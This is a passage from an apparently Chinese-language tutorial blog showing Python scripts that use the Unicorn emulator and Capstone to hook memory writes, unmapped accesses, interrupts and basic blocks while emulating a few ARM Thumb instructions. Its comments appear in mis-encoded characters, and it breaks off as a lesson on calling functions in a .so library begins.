value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))  <span class="comment">#ä¸ä¼šæ‰§è¡Œ åº”ä¸ºæ²¡æœ‰å†…å­˜ç©ºé—´å†™æ•°æ®(æ²¡æœ‰æ¨¡æ‹Ÿè¿™ä¸ªè™šæ‹Ÿç©ºé—´)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #æ‰“å°å†…å­˜ä¸­çš„å€¼</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE-UNMAPPED">UC_HOOK_MEM_WRITE_UNMAPPED</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#æ‰“å°armä¸‹æ‰€æœ‰å¯„å­˜å™¨çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED: <span class="comment">#å¦‚æœå¯¹å†…å­˜æ“ä½œæ˜¯å†™</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value)) <span class="comment">#å†™å…¥çš„å€¼åº”ä¸ºR0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED: <span class="comment">#å¦‚æœå¯¹å†…å­˜æ“ä½œæ˜¯è¯»</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))  </span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#æ˜ å°„ä¸€ä¸ªç©ºé—´å­˜æ”¾æ ˆæ•°æ®</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#è¿”å›true æ¨¡æ‹Ÿå™¨ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œä»£ç   Falseåˆ™ç›¸å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span>=mu.mem_read(<span class="number">0x0</span>,<span class="number">4</span>)   <span class="comment">#æ‰“å°å†…å­˜ä¸­çš„å€¼  åœ°å€æ ¹æ®ä¸Šé¢çš„hook_mem_unmappedæ•°æ®å­˜æ”¾çš„ä½ç½®ç¡®å®š</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-INTR">UC_HOOK_INTR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#æ‰“å°armä¸‹æ‰€æœ‰å¯„å­˜å™¨çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookintr_t)(uc_engine *uc, uint32_t intno, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_syscall</span>(<span class="params">mu,intno,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#æ˜ å°„</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#è¿”å›true æ¨¡æ‹Ÿå™¨ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œä»£ç   Falseåˆ™ç›¸å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C] mov r7,1   SVC 0</span></span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_INTR,hook_syscall)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># æ‰“å°å†…å­˜ä¸­çš„å€¼</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-BLOCK">UC_HOOK_BLOCK</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#æ‰“å°armä¸‹æ‰€æœ‰å¯„å­˜å™¨çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#æ˜ å°„</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#è¿”å›true æ¨¡æ‹Ÿå™¨ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œä»£ç   Falseåˆ™ç›¸å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    mu.hook_add(UC_HOOK_BLOCK,hook_block)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># æ‰“å°å†…å­˜ä¸­çš„å€¼</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸‰è¯¾æ—¶">ç¬¬ä¸‰è¯¾æ—¶</h2><h3 id="è°ƒç”¨soä¸­å‡½æ•°">è°ƒç”¨soä¸­å‡½æ•°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å°å¯„å­˜å™¨å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#æ˜ å°„</span></span><br><span class="line">    <span class="built_in">print</span>(<span 